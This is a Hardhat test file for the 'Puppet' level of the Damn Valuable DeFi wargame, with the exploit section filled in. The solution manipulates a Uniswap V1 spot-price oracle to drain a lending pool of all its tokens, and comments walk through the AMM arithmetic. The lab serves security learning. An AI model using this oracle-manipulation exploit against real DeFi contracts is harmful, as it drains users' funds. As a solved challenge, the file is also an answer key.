const exchangeJson = require('../../build-uniswap-v1/UniswapV1Exchange.json');
const factoryJson = require('../../build-uniswap-v1/UniswapV1Factory.json');

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
  tokensSold,
  tokensInReserve,
  etherInReserve
) {
  return tokensSold
    .mul(ethers.BigNumber.from('997'))
    .mul(etherInReserve)
    .div(
      tokensInReserve
        .mul(ethers.BigNumber.from('1000'))
        .add(tokensSold.mul(ethers.BigNumber.from('997')))
    );
}

describe('[Challenge] Puppet', function () {
  let deployer, attacker;

  // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
  const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
  const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const UniswapExchangeFactory = new ethers.ContractFactory(
      exchangeJson.abi,
      exchangeJson.evm.bytecode,
      deployer
    );
    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.evm.bytecode,
      deployer
    );

    const DamnValuableTokenFactory = await ethers.getContractFactory(
      'DamnValuableToken',
      deployer
    );
    const PuppetPoolFactory = await ethers.getContractFactory(
      'PuppetPool',
      deployer
    );

    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x15af1d78b58c40000', // 25 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ATTACKER_INITIAL_ETH_BALANCE
    );

    // Deploy token to be traded in Uniswap
    this.token = await DamnValuableTokenFactory.deploy();

    // Deploy a exchange that will be used as the factory template
    this.exchangeTemplate = await UniswapExchangeFactory.deploy();

    // Deploy factory, initializing it with the address of the template exchange
    this.uniswapFactory = await UniswapFactoryFactory.deploy();
    await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

    // Create a new exchange for the token, and retrieve the deployed exchange's address
    let tx = await this.uniswapFactory.createExchange(this.token.address, {
      gasLimit: 1e6,
    });
    const { events } = await tx.wait();
    this.uniswapExchange = await UniswapExchangeFactory.attach(
      events[0].args.exchange
    );

    // Deploy the lending pool
    this.lendingPool = await PuppetPoolFactory.deploy(
      this.token.address,
      this.uniswapExchange.address
    );

    // Add initial token and ETH liquidity to the pool
    await this.token.approve(
      this.uniswapExchange.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    );
    await this.uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    );

    // Ensure Uniswap exchange is working as expected
    expect(
      await this.uniswapExchange.getTokenToEthInputPrice(
        ethers.utils.parseEther('1'),
        { gasLimit: 1e6 }
      )
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        ethers.utils.parseEther('1'),
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    );

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    await this.token.transfer(
      this.lendingPool.address,
      POOL_INITIAL_TOKEN_BALANCE
    );

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(
      await this.lendingPool.calculateDepositRequired(
        ethers.utils.parseEther('1')
      )
    ).to.be.eq(ethers.utils.parseEther('2'));

    expect(
      await this.lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    /**
     * AMM Formula: X * Y = k
     *
     * 1 - Devalue DVT by depositing 1000 tokens
     * 10 ETH : 10 DVT => k = 10 * 10 = 100
     * X ETH  : 1010 DVT => X = 100 / 1010 = 0.09901
     * We receive: 10 - 0.09901 = 9.90099 ETH
     *
     * 2 - borrow all DVT from the pool
     * 100000 DVT costs (0.09 / 1010) * 100000 * 2 = 17.8 ETH
     * We are left off with ~15 ETH + 100000 DVT
     *
     * 3 - put uniswap pool to original ratio
     * We put back 10 ETH which gives us 1000 DVT
     * Ratio: 10 ETH : 10 DVT
     */
    const attackPuppet = this.lendingPool.connect(attacker);
    const attackToken = this.token.connect(attacker);
    const attackUniSwap = this.uniswapExchange.connect(attacker);

    await attackToken.approve(
      attackUniSwap.address,
      ATTACKER_INITIAL_TOKEN_BALANCE
    );

    await attackUniSwap.tokenToEthSwapInput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      ethers.utils.parseEther('9'),
      (await ethers.provider.getBlock('latest')).timestamp * 2
    );

    const deposit = await attackPuppet.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit });

    const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
    const ethReq = await attackUniSwap.getEthToTokenOutputPrice(
      tokensToBuyBack,
      { gasLimit: 1e6 }
    );

    await attackUniSwap.ethToTokenSwapOutput(
      tokensToBuyBack,
      (await ethers.provider.getBlock('latest')).timestamp * 2,
      { value: ethReq }
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq('0');
    expect(await this.token.balanceOf(attacker.address)).to.be.gt(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
